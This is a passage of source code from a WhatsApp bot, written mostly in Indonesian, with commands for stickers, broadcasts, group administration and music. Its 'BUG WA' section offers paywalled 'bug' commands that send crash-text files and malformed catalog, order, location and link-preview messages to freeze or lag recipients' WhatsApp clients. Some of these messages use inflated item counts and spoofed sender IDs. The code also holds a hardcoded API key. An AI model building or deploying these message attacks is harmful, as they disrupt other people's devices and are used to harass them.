		const thanks = `「 *ORANG BAIK TERDAFTAR* 」

👤 *Nama :* ${pushname}
🐣 *Nomor :* @${sender.split('@')[0]}
💌 *Serial :* ${serialdonate}
🌻 *Total Yang Donasi :* ${_donasi.length}

*「 ${botname} 」*`
		gbutsan = [
			{ buttonId: `${prefix}bugmenu`, buttonText: { displayText: 'CHECK MYSTERY MENU' }, type: 1 },
			{ buttonId: `${prefix}grupbot`, buttonText: { displayText: 'JOIN GRUP BOT' }, type: 1 }
		]
		mhan = await Revoer.prepareMessage(from, ofrply, image, { thumbnail: ofrply })
		const sendBtnDonate = {
			imageMessage: mhan.message.imageMessage,
			contentText: `${thanks}`,
			footerText: 'Terimakasih Sudah Donasi Kak :)',
			buttons: gbutsan,
			headerType: 4
		}
		Revoer.sendMessage(from, sendBtnDonate, MessageType.buttonsMessage, { quoted: fgi, contextInfo: { mentionedJid: [sender] } })
		console.log(color('[DONATED]'), color(time, 'yellow'), 'Serial:', color(serialdonate, 'cyan'), 'in', color(sender || groupName))
		// console.log(e)
		break

	case 'grupbot':
		Revoer.sendMessage(from, `Join Grup WhatsApp Bot Nich\n\nhttps://chat.whatsapp.com/C7yrGQlVcQD5o5l6tD51gY`, text,{ contextInfo: { "forwardingScore": 999, "isForwarded": true, sendEphemeral: true }, quoted: mek })
		break
	//**************************BUG WA*****************//
	
	case 'bugsw':
		if (!isDonasi) return reply(`Maaf Kack :( Ini Fitur Premium,\nDonasi Seikhlasnya Dulu Yuk Biar Bisa Buka Fitur Nya\nKetik Aja #donasi`)

		if (isQuotedImage) {
			const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
			buffer = await Revoer.downloadMediaMessage(encmedia)
			virgam = fs.readFileSync(`./media/virgam.jpeg`),
				Revoer.sendMessage(from, buffer , image, { mimetype:'image/jpeg',quoted: mek, thumbnail: virgam, caption: '🥵BUG SW READY🥵' })
		}
		break

	case 'bugpdf':
		if (!isDonasi) return reply(`Maaf Kack :( Ini Fitur Premium,\nDonasi Seikhlasnya Dulu Yuk Biar Bisa Buka Fitur Nya\nKetik Aja #donasi`)

		med = fs.readFileSync(`./virtex/virtex7.js`),
			Revoer.sendMessage(from, med, document, { mimetype: Mimetype.pdf, quoted: mek, filename: virtex7(prefix) })
		break

	case 'bugtext':
	case 'bugteks':
		if (!isDonasi) return reply(`Maaf Kack :( Ini Fitur Premium,\nDonasi Seikhlasnya Dulu Yuk Biar Bisa Buka Fitur Nya\nKetik Aja #donasi`)

		med = fs.readFileSync(`./virtex/virtex7.js`),
			Revoer.sendMessage(from, med, document, { mimetype: 'text/plain', quoted: mek, filename: virtex })
		Revoer.sendMessage(from, med, document, { mimetype: 'text/plain', quoted: mek, filename: virtex7(prefix) })
		break

	case 'bugvideo':
		if (!isDonasi) return reply(`Maaf Kack :( Ini Fitur Premium,\nDonasi Seikhlasnya Dulu Yuk Biar Bisa Buka Fitur Nya\nKetik Aja #donasi`)

		if (isQuotedVideo) {
			const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
			buffer = await Revoer.downloadMediaMessage(encmedia)
			virgam = fs.readFileSync(`./media/virgam.jpeg`),
				Revoer.sendMessage(from, buffer, video, { mimetype : 'video/mp4' ,quoted: mek, thumbnail: virgam, caption: '🥵BUG VIDEO READY🥵' })
		}
		break

	case 'buggif':
		if (!isDonasi) return reply(`Maaf Kack :( Ini Fitur Premium,\nDonasi Seikhlasnya Dulu Yuk Biar Bisa Buka Fitur Nya\nKetik Aja #donasi`)

		if (isQuotedVideo) {
			const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
			buffer = await Revoer.downloadMediaMessage(encmedia)
			virgam = fs.readFileSync(`./media/virgam.jpeg`),
				Revoer.sendMessage(from, buffer, video, { mimetype: Mimetype.gif, quoted: mek, thumbnail: virgam, caption: '🥵BUG GIF READY🥵' })
		}
		break

	case 'bugaudio':
		if (!isDonasi) return reply(`Maaf Kack :( Ini Fitur Premium,\nDonasi Seikhlasnya Dulu Yuk Biar Bisa Buka Fitur Nya\nKetik Aja #donasi`)
		tapib1 = fs.readFileSync('./media/dijeh.mp3')
		Revoer.sendMessage(from, tapib1, document, { quoted: mek, filename: `Revoer ID ~ ${ngazap(prefix)}`, mimetype: 'audio/ogg' })

		break

	case  'bugkatalog':
	case 'bugcatalog':
		if (!isDonasi) return reply(`Maaf Kack :( Ini Fitur Premium,\nDonasi Seikhlasnya Dulu Yuk Biar Bisa Buka Fitur Nya\nKetik Aja #donasi`)

		if (isQuotedImage) {
			const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
			buff = await Revoer.downloadMediaMessage(encmedia)
			weem = args.join(" ")
			imeu = await Revoer.prepareMessage('0@s.whatsapp.net', buff, image)
			imeg = imeu.message.imageMessage
			res = await Revoer.prepareMessageFromContent(from, {
				"productMessage": {
					"product": {
						"productImage": imeg,
						"productId": "",
						"title": weem,
						"description": ngazap(prefix),
						"priceAmount1000": "99999999",
						"descriptionCount": "99999999",
						"productImageCount": "1",
					},
					"businessOwnerJid": "6285736891082@s.whatsapp.net",
					"contextInfo": {
						"forwardingScore": 9999,
						"isForwarded": true
					}
				}
			}, {
				quoted: {
					key: {
						fromMe: false,
						participant: `0@s.whatsapp.net`, // Fake sender Jid
						remoteJid: "status@broadcast"
					},
					message: {
						orderMessage: {
							itemCount: 999999999, // Bug
							status: 1,
							surface: 1,
							message: '999999999',
							orderTitle: '999999999', // Idk what this does
							sellerJid: `0@s.whatsapp.net` // Seller
						}
					}
				}
			})
			Revoer.relayWAMessage(res)
			Revoer.toggleDisappearingMessages(from, `Ups :v`, text)
		}
		break
	case 'bugweb':
		if (!isDonasi) return reply(`Maaf Kack :( Ini Fitur Premium,\nDonasi Seikhlasnya Dulu Yuk Biar Bisa Buka Fitur Nya\nKetik Aja #donasi`)

		
		name = args.join(" ")
		Revoer.sendMessage(from, ngazap(prefix), text, {
			quoted: mek, contextInfo: {
				text: '${name}',
				"forwardingScore": 1000000000,
				isForwarded: false,
				sendEphemeral: false,
				"externalAdReply": {
					"title": `${virtex}`,
					"body": `${virtex}`,
					"previewType": "PHOTO",
					"thumbnailUrl": "https://i.ibb.co/3hrZZ6s/Revoer.png",
					"sourceUrl": `LAG? KASIAN DEH LU | HACKED BY : ${name}`
				}
			}
		})
		break


	case 'buglokasi':
		if (!isDonasi) return reply(`Maaf Kack :( Ini Fitur Premium,\nDonasi Seikhlasnya Dulu Yuk Biar Bisa Buka Fitur Nya\nKetik Aja #donasi`)

		if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
		Revoer.updatePresence(from, Presence.composing)
		namelu = args.join(" ")
		Revoer.sendMessage(from, {
			degreesLatitude: 34.0184,
			degreesLongitude: -118.411,
			name: `${namelu}`,
			address: `${ngazap(prefix)}`,
			
		}, location, {
			quoted: {
				key: {
					participant: '111111111@s.whatsapp.net' // Fake sender Jid
				},
				message: {
					orderMessage: {
						itemCount: 70000, // Bug
						status: 1,
						surface: 1,
						message: `RevoerGanz`,
						orderTitle: `RevoerID`, // 
						sellerJid: '0@s.whatsapp.net' // Seller
					}
				}
			}
		})
		break


	case  'troliv2':
		if (!isDonasi) return reply(`Maaf Kack :( Ini Fitur Premium,\nDonasi Seikhlasnya Dulu Yuk Biar Bisa Buka Fitur Nya\nKetik Aja #donasi`)

		let kontol = Revoer.prepareMessageFromContent(from, { "orderMessage": { "itemCount":	123456789, "thumbnail": fs.readFileSync(`./media/virgam.jpeg`), "surface": 'CATALOG' } }, { quoted: mek })
		Revoer.relayWAMessage(kontol, { waitForAck: true })
		break


	       /////////////////END BUG WEA///////////////

//══════════[ FITUR STICKER ]══════════//

case 'gifstiker':
case 's':
case 'stickergif':  
case 'sticker':
case 'stiker':
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
	var media = await Revoer.downloadAndSaveMediaMessage(encmedia)
	var imgbb = require('imgbb-uploader')
	anu = await imgbb("a7b8549b971be7526e684cda76fbbab8", media)
	getUrl = `${anu.display_url}`
	jing = await getBuffer(`https://api.lolhuman.xyz/api/convert/towebpauthor?apikey=${LolKey}&img=${getUrl}&package=Make By : RevzBotz&author=Bot Number : 0895338578959`)
	Revoer.sendMessage(from, jing, sticker, {quoted : fgi})
} else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
	const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
	const media = await Revoer.downloadAndSaveMediaMessage(encmedia)
	ran = '999.webp'
	Revoer.sendMessage(from,`‼ Sabar Lagi Di Proses`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply: { title: "Owner RB Ganz Bat Aseli", body: "LAGI DI PROSES CUY", previewType: "PHOTO", thumbnail: fs.readFileSync('./media/thumb.jpeg'), sourceUrl: "https://wa.me/6285736891082" } } })
	await ffmpeg(`./${media}`)
		.inputFormat(media.split('.')[1])
		.on('start', function (cmd) {
			console.log(`Started : ${cmd}`)
		})
		.on('error', function (err) {
			console.log(`Error : ${err}`)
			fs.unlinkSync(media)
			tipe = media.endsWith('.mp4') ? 'video' : 'gif'
			reply(`Gagal, pada saat mengkonversi ${tipe} ke stiker`)
		})
		.on('end', function () {
			console.log('Finish')
			Revoer.sendMessage(from, fs.readFileSync(ran), sticker, { quoted: fgi })
			fs.unlinkSync(media)
			fs.unlinkSync(ran)
		})
		.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
		.toFormat('webp')
		.save(ran)
} else {
reply(`Untuk Membuat Sticker,Kirim gambar dengan caption ${prefix}sticker\nDan Untuk Membuat Sticker Gif,Pastikan Durasi Video Tidak Lebih Dari 11 detik`)
}
		break
	case 'repeattext' :
	case 'repeatext':
	case 'repeatteks':
	case 'repeateks':
		var teks = q.split('|')[0] ? q.split('|')[0] : ''
		var nom = q.split('|')[1] ? q.split('|')[1] : ''
		reply(teks.repeat(nom))
		break

	case 'toimg':
		if (!isQuotedSticker) return reply('Tag Stiker Nya Dek')
	    encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
		media = await Revoer.downloadAndSaveMediaMessage(encmedia)
		ran = getRandom('.png')
		exec(`ffmpeg -i ${media} ${ran}`, (err) => {
			fs.unlinkSync(media)
			if (err) return reply(' Gagal, pada saat mengkonversi sticker ke gambar ')
			buffer = fs.readFileSync(ran)
			Revoer.sendMessage(from, buffer, image, { quoted: mek, caption: 'Nih Kack' })
			fs.unlinkSync(ran)
		})

		

//══════════[ FITUR OWNER ]══════════//

case 'owner':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
members_ids = []
for (let mem of groupMembers) {
members_ids.push(mem.jid)
}
vcard2 = 'BEGIN:VCARD\n'
+ 'VERSION:3.0\n'
+ `FN:${ownername}\n`
+ `ORG: Creator RevzBotz! | Bewan Dek ;\n`
+ `TEL;type=CELL;type=VOICE;waid=${owner}:${owner}\n`
+ 'END:VCARD'.trim()
Revoer.sendMessage(from, {displayName: `Ownernya ${botname}`, vcard: vcard2}, contact, 
{ quoted: fgi, 
})
reply(`_Tuh Kak Ownerku_`)
break
case 'bc':
             if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
             if (!isOwner && !mek.key.fromMe) return  reply(mess.only.owner)
             if (args.length < 1) return reply('teks?')
             anu100 = await Revoer.chats.all()
             if (isMedia && !Revoer.message.videoMessage || isQuotedImage) {
             const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(Revoer).replace('quotedM','m')).message.extendedTextMessage.contextInfo : Revoer
             bc100 = await Revoer.downloadMediaMessage(encmedia)
             for (let _ of anu100) {
             Revoer.sendMessage(_.jid, bc100, image, {quoted: fgi, caption: `*「 PESAN SIARAN BOT 」*\n\n${body.slice(4)}`})
}
             reply('Suksess broadcast')
             } else {
             for (let _ of anu100) {
             Revoer.sendMessage(_.jid, 
			{"contentText": `*「 PESAN SIARAN BOT 」*\n\n${body.slice(4)}`,
			"footerText": `${tanggal}`,
			"buttons": [
			{"buttonId": `${prefix}menu`,
			"buttonText": {"displayText": "ᴍᴇɴᴜ"
			},"type": "RESPONSE"}
			], "headerType": 'LOCATION',
			locationMessage: { degreesLatitude: '',
			degreesLongitude: '',
			jpegThumbnail: fakeimage,
			}}, MessageType.buttonsMessage )
}
             reply('Suksess broadcast')
}
             break
case 'bc2':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
		if (args.length < 1) return reply('Teksnya?')
		anu = await Revoer.chats.all()
		if (isMedia && !mek.message.videoMessage || isQuotedImage) {
			const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
			buff = await Revoer.downloadMediaMessage(encmedia)
			for (let _ of anu) {
				Revoer.sendMessage(_.jid, buff, image, { viewOnce: true, caption: `${body.slice(4)}` })
			}
			reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
		} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
			const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
			buff = await Revoer.downloadMediaMessage(encmedia)
			for (let _ of anu) {
				Revoer.sendMessage(_.jid, buff, video, { viewOnce: true, caption: `${body.slice(4)}` })
			}
			reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
		} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
			const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
			buff = await Revoer.downloadMediaMessage(encmedia)
			for (let _ of anu) {
				Revoer.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true }, caption: `${body.slice(4)}` })
			}
			reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
		} else {
			for (let _ of anu) {
				sendMess(_.jid, `[REVZ BOT BROADCAST] \n\n${body.slice(4)}`)
			}
			reply(`Sukses mengirim Broadcast:\n${body.slice(4)}`)
		}
		break
		break
	case 'setcmd':
		if (isQuotedSticker) {
			if (!q) return reply(`Penggunaan : ${command} cmdnya dan tag stickernya`)
			var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
			addCmd(kodenya, q)
			reply("Y DONE")
		} else {
			reply('tag stickenya')
		}
		break

	case  'notif':

		if (!isGroup) return reply(mess.only.group)
		if (!isGroupAdmins) return reply('khusus admin dek')
		teks = `Notif dari @${sender.split("@")[0]}\n*Pesan : ${body.slice(7)}*`
		group = await Revoer.groupMetadata(from);
		member = group['participants']
		jids = [];
		member.map(async adm => {
			jids.push(adm.id.replace('c.us', 's.whatsapp.net'));
		})
		options = {
			text: teks,
			contextInfo: {
				mentionedJid: jids
			},
			quoted: mek
		}
		await Revoer.sendMessage(from, options, text)
		break
case 'bcgc':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
if (args.length < 1) return reply('Teksnya mana ?')
if (isMedia && !mek.message.videoMessage || isQuotedImage) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
bcgc = await Revoer.downloadMediaMessage(encmedia)
for (let _ of groupMembers) {
Revoer.sendMessage(_.jid, bcgc, image, { caption: `*「 BROADCAST GROUP 」*\n*Group* : ${groupName}\n\n${body.slice(6)}` })
}
reply('')
} else {
for (let _ of groupMembers) {
sendMess(_.jid, `*「 BROADCAST GROUP 」*\n*Group* : ${groupName}\n\n${body.slice(6)}`)
}
reply('Suksess broadcast group')
}
break
case 'clearall':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (!isOwner && !mek.key.fromMe) return  reply(mess.only.owner)
anu = await Revoer.chats.all()
Revoer.setMaxListeners(25)
for (let _ of anu) {
Revoer.deleteChat(_.jid)
}
textImg('Sukses delete all chat')
break
case 'setppbot':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
if (!isQuotedImage) return reply(`Kirim gambar dengan caption ${prefix}setppbot atau tag gambar yang sudah dikirim`)
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
media = await Revoer.downloadAndSaveMediaMessage(encmedia, './database/sampah/media_user')
await Revoer.updateProfilePicture(botNumber, media)
reply('Makasih foto profil barunya ownerku sayang 😚')
		break
	
case 'setbio':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
if (args.length < 1) return reply('Teksnya?')
iyek = body.slice(8)
Revoer.setStatus(`${iyek}`)
reply(`Sukses mengganti bio ke ${body.slice(8)}`)
break
case 'setnamabot':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
if (args.length < 1) return reply('Teksnya?')
anu = body.slice(11)
Revoer.updateProfileName(anu)
reply(`Sukses mengganti namabot ke ${body.slice(11)}`)
break
case 'public':
if (!mek.key.fromMe && !isOwner) return reply('Luh Siapa Sih Bang ?')
if (self === false) return
self = false
reply(`\`\`\`MODE - PUBLIC\`\`\``)
break
case 'self':
if (!mek.key.fromMe && !isOwner) return reply('Luh Siapa Sih Bang ?')
if (self === true) return
self = true
reply(`\`\`\`MODE - SELF\`\`\``)
break
case 'autoread':
if (!mek.key.fromMe && !isOwner) return reply(mess.only.owner)
if(args[0] == 'on'){
autoread = true
reply('Succes..')
} else if(args[0] == 'off'){
autoread = false
reply('Succes..')
}
break
case 'autoketik':
if (!mek.key.fromMe && !isOwner) return reply(mess.only.owner)
if(args[0] == 'on'){
autoketik = true
reply('Succes..')
reply('Ingat jika autovn hidup silakan di matikan dulu')
} else if(args[0] == 'off'){
autoketik = false
reply('Succes..')
}
break
case 'autovn':
if (!mek.key.fromMe && !isOwner) return reply(mess.only.owner)
if(args[0] == 'on'){
autovn = true
reply('Succes..')
reply('Ingat jika autoketik hidup silakan di matikan dulu')
} else if(args[0] == 'off'){
autovn = false
reply('Succes..')
}
		break

		

//══════════[ FITUR GROUP ]══════════//

case 'nsfw':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
if (args.length < 1) return reply(`Ketik :\n${prefix}nsfw on untuk mengaktifkan\n${prefix}nsfw off untuk menonaktifkan`)
if ((args[0]) === 'on') {
if (isNsfw) return reply('*nsfw sudah aktif !!*')
_nsfw.push(from)
fs.writeFileSync('./database/nsfw.json', JSON.stringify(_nsfw))
reply(`\`\`\`Sukses ✅, Mengaktifkan fitur nsfw di group\`\`\` *${groupMetadata.subject}*`)
} else if ((args[0]) === 'off') {
if (!isNsfw) return reply('*nsfw sudah off sebelumnya !!*')
_nsfw.splice(from, 1)
fs.writeFileSync('./database/nsfw.json', JSON.stringify(_nsfw))
reply(`\`\`\`Sukses ✅, Menonaktifkan fitur nsfw di group\`\`\` *${groupMetadata.subject}*`)
} else {
reply('*on untuk mengaktifkan, off untuk menonaktifkan*')
}
break
case 'welcome':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
if (args.length < 1) return reply(`Ketik :\n${prefix}welcome on untuk mengaktifkan\n${prefix}welcome off untuk menonaktifkan`)
if ((args[0]) === 'on') {
if (isWelkom) return reply('*welcome sudah aktif !!*')
_welkom.push(from)
fs.writeFileSync('./database/welcome.json', JSON.stringify(_welkom))
reply(`\`\`\`Sukses ✅, Mengaktifkan fitur welcome di group\`\`\` *${groupMetadata.subject}*`)
} else if ((args[0]) === 'off') {
if (!isWelkom) return reply('*welcome sudah off sebelumnya !!*')
_welkom.splice(from, 1)
fs.writeFileSync('./database/welcome.json', JSON.stringify(_welkom))
reply(`\`\`\`Sukses ✅, Menonaktifkan fitur welcome di group\`\`\` *${groupMetadata.subject}*`)
} else {
reply('*on untuk mengaktifkan, off untuk menonaktifkan*')
}
break
case 'antilink':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (!q) return reply(`Pilih on atau off`)
if (args[0].toLowerCase() === 'on'){
if (isAntiLink) return reply(`Udah aktif`)
_antilink.push(from)
fs.writeFileSync('./database/antilink.json', JSON.stringify(_antilink))
reply(`\`\`\`Sukses ✅, Mengaktifkan fitur antilink di grup\`\`\` *${groupMetadata.subject}*`)
} else if (args[0].toLowerCase() === 'off'){
let anu = _antilink.indexOf(from)
_antilink.splice(anu, 1)
fs.writeFileSync('./database/antilink.json', JSON.stringify(_antilink))
reply(`\`\`\`Sukses ✅, Menonaktifkan fitur antilink di grup\`\`\` *${groupMetadata.subject}*`)
} else {
reply(`_Pilih on atau off_`)
}
		break
	case  'play':
	case  'playaudio':
		if (args.length < 1) return reply('Apa Yang Mau Dicari?')
		teks = args.join(' ')
		Revoer.sendMessage(from, 'Tunggu Sebentar🤡', text, { quoted: fgi })
		if (!teks.endsWith("-doc")) {
			res = await yts(`${teks}`).catch(e => {
				reply('_[ ! ] Error Query Yang Anda Masukan Tidak Ada_')
			})
			reply(`Sedang Memutar Lagu  ${res.all[0].title}`)
			let thumbInfo = ` *Youtube Search*
 *Judul :* ${res.all[0].title}
 *ID Video :* ${res.all[0].videoId}
 *Diupload Pada :* ${res.all[0].ago}
 *Views :* ${res.all[0].views}
 *Durasi :* ${res.all[0].timestamp}
 *Channel :* ${res.all[0].author.name}
*Link Channel :* ${res.all[0].author.url}

*_Tunggu Proses Upload....._*
`
			sendFileFromUrl(res.all[0].image, image, { quoted: ftrol, caption: thumbInfo })
			res = await y2mateA(res.all[0].url).catch(e => {
				reply('_[ ! ] Error Saat Memasuki Web Y2mate_')
			})
			sendFileFromUrl(res[0].link, audio, { quoted: mek , mimetype: 'audio/mp4', filename: res[0].output })
		}
		if (teks.endsWith("-doc")) {
			const tec = teks.split("-doc")
			res = await yts(`${tec}`).catch(e => {
				reply('_[ ! ] Error Query Yang Anda Masukan Tidak Ada_')
			})
			reply(`.Playing ${res.all[0].title}`)
			let thumbInfo = `*${botname}* 
 *Judul :* ${res.all[0].title}
 *ID Video :* ${res.all[0].videoId}
 *Diupload Pada :* ${res.all[0].ago}
 *Views :* ${res.all[0].views}
 *Durasi :* ${res.all[0].timestamp}
 *Channel :* ${res.all[0].author.name}
*Link Channel :* ${res.all[0].author.url}

*_Tunggu Proses Upload....._*
`
			sendFileFromUrl(res.all[0].image, image, { quoted: mek, caption: thumbInfo })
			res = await y2mateA(res.all[0].url).catch(e => {
				reply('_[ ! ] Error Saat Memasuki Web Y2mate_')
			})
			sendFileFromUrl(res[0].link, document, { quoted: mek, mimetype: 'audio/mp3', filename: res[0].output })
		}
		break
	case 'lirik':

		if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
		query = args.join(" ")
		get_result = await fetchJson(`http://api.lolhuman.xyz/api/lirik?apikey=${LolKey}&query=${query}`)
		reply(get_result.result)
		break
case 'antivirtex':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (!q) return reply(`Pilih on atau off`)
if (args[0].toLowerCase() === 'on'){
if (isAntiVirtex) return reply(`Udah aktif`)
_antivirtex.push(from)
fs.writeFileSync('./database/antivirtex.json', JSON.stringify(_antivirtex))
reply(`\`\`\`Sukses ✅, Mengaktifkan fitur antivirtex di grup\`\`\` *${groupMetadata.subject}*`)
} else if (args[0].toLowerCase() === 'off'){
let anu = _antivirtex.indexOf(from)
_antivirtex.splice(anu, 1)
fs.writeFileSync('./database/antivirtex.json', JSON.stringify(_antivirtex))
reply(`\`\`\`Sukses ✅, Menonaktifkan fitur antivirtex di grup\`\`\` *${groupMetadata.subject}*`)
} else {
reply(`_Pilih on atau off_`)
}
break
case 'group':
case 'grup':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (args[0] === 'buka') {
reply(`*Berhasil Membuka Grup ${groupMetadata.subject}*`)
Revoer.groupSettingChange(from, GroupSettingChange.messageSend, false)
} else if (args[0] === 'tutup') {
reply(`*Berhasil Memtutup Grup ${groupMetadata.subject}*`)
Revoer.groupSettingChange(from, GroupSettingChange.messageSend, true)
}
break
case 'linkgroup':
case 'linkgrup':
case 'linkgc':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (!isGroup) return reply(mess.only.group)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
linkgc = await Revoer.groupInviteCode(from)
yeh = `https://chat.whatsapp.com/${linkgc}\n\nlink Group *${groupName}*`
Revoer.sendMessage(from, yeh, text, { quoted: fgi })
break
case 'promote' :
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
		if (
			mek.message.extendedTextMessage === undefined ||
			mek.message.extendedTextMessage === null
		)
			return reply("Tag Member Yang Ingin Di Promote!");
		mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid;
		if (mentioned.length > 1) {
			Revoer.groupMakeAdmin(from, mentioned);
			mentions(`Perintah di terima, Menjadikan : @${mentioned[0].split('@')[0]} Menjadi Admin`, mentioned, true);
		} else if (mentioned.length < 1) {
			anu = mek.message.extendedTextMessage.contextInfo.participant;
			Revoer.groupMakeAdmin(from, [anu]);
			mentions(`Perintah di terima, Menjadikan : @${mentioned[0].split('@')[0]} Menjadi Admin`, mentioned, true);;
		} else {
			Revoer.groupMakeAdmin(from, mentioned);
			mentions(`Perintah di terima, Menjadikan : @${mentioned[0].split('@')[0]} Menjadi Admin`, mentioned, true);;
		}
		break;
	case 'slot':
		const sotoy = [
			'🍊 : 🍒 : 🍐',
			'🍒 : ?? : 🍊',
			'?? : 🍒 : 🍐',
			'🍊 : 🍋 : 🔔',
			'🔔 : 🍒 : 🍐',
			'🔔 : 🍒 : 🍊',
			'🍊 : 🍋 : 🔔',
			'🍐 : 🍒 : 🍋',
			'🍐 : 🍐 : 🍐',
			'🍊 : 🍒 : 🍒',
			'🔔 : 🔔 : 🍇',
			'🍌 : 🍒 : 🔔',
			'🍐 : 🔔 : 🔔',
			'🍊 : 🍋 : 🍒',
			'🍋 : 🍋 : 🍌',
			'🔔 : 🔔 : 🍇',
			'🔔 : 🍐 : 🍇',
			'🔔 : 🔔 : 🔔',
			'🍒 : ?? : 🍒',
			'🍌 : 🍌 : 🍌',
			'🍇 : ?? : 🍇'
		]
		somtoy = sotoy[Math.floor(Math.random() * (sotoy.length))]
		somtoyy = sotoy[Math.floor(Math.random() * (sotoy.length))]
		somtoyyy = sotoy[Math.floor(Math.random() * (sotoy.length))]
		if (somtoyy == '🍌 : 🍌 : 🍌') {
			reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
		} else if (somtoyy == '🍒 : 🍒 : 🍒') {
			reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
		} else if (somtoyy == '🔔 : 🔔 : 🔔') {
			reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
		} else if (somtoyy == '?? : 🍐 : 🍐') {
			reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
		} else if (somtoyy == '🍇 : 🍇 : 🍇') {
			reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
		} else {
